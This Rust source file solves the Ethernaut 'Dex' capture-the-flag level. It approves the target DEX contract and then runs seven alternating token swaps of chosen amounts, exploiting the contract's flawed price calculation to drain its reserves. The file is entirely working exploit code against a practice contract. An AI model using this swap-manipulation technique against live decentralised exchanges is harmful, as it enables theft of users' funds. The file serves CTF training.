use async_trait::async_trait;
use ctf::ethernaut::lvl22_dex::*;
use ethers::types::U256;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let contract = Dex::new(target.address, offender.clone());
        let token1 =
            SwappableToken::new(contract.token_1().await?, offender.clone());
        let token2 =
            SwappableToken::new(contract.token_2().await?, offender.clone());

        println!("token1: {:?}", token1.balance_of(offender.address()).await?);
        println!("token2: {:?}", token2.balance_of(offender.address()).await?);

        contract
            .approve(contract.address(), U256::from(1000))
            .send()
            .await?
            .await?;

        contract
            .swap(token2.address(), token1.address(), U256::from(10))
            .send()
            .await?;
        contract
            .swap(token1.address(), token2.address(), U256::from(20))
            .send()
            .await?;
        contract
            .swap(token2.address(), token1.address(), U256::from(24))
            .send()
            .await?;
        contract
            .swap(token1.address(), token2.address(), U256::from(30))
            .send()
            .await?;
        contract
            .swap(token2.address(), token1.address(), U256::from(41))
            .send()
            .await?;
        contract
            .swap(token1.address(), token2.address(), U256::from(65))
            .send()
            .await?;
        contract
            .swap(token2.address(), token1.address(), U256::from(45))
            .send()
            .await?;
        Ok(())
    }
}
